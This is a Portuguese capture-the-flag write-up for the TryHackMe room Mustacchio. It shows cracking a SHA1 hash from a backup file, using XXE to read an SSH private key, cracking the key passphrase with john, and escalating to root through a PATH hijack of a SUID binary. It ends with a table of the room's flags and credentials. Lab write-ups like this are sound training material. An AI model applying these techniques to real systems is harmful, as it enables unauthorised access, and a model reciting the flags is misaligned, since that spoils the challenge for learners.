# mustacchio — TryHackMe

```text
[ TARGET ] 10.64.163.102
[ ROOM   ] Mustacchio
[ GOAL   ] user.txt / root.txt
[ STATUS ] DONE
```

## 01 — Credenciais (users.bak)

```console
$ file users.bak
SQLite 3.x database

$ strings users.bak
admin 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

$ # SHA1 → bulldog19
```

→ Achado: `admin:bulldog19`.

## 02 — Admin + XXE

```console
$ # painel :8567 → login admin
# comentário/XML → XXE lê arquivos locais
# lê /home/barry/.ssh/id_rsa
```

```console
$ ssh2john barry_id_rsa > barry.hash
$ john --wordlist=rockyou.txt barry.hash
# passphrase crackeada → SSH barry
```

```console
$ ssh -i barry_id_rsa barry@10.64.163.102
$ cat /home/barry/user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```

## 03 — Privesc (PATH / live_log)

```console
$ find / -perm -4000 -type f 2>/dev/null
/home/joe/live_log   # SUID

$ strings /home/joe/live_log
# chama `tail` por path relativo

$ # PATH hijack → fake `tail` → root shell
$ /home/joe/live_log
$ cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5
```

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| admin | `admin` / `bulldog19` |
| user.txt | `62d77a4d5f97d47c5aa38b3b2651b831` |
| root.txt | `3223581420d906c4dd1a5f9b530393a5` |
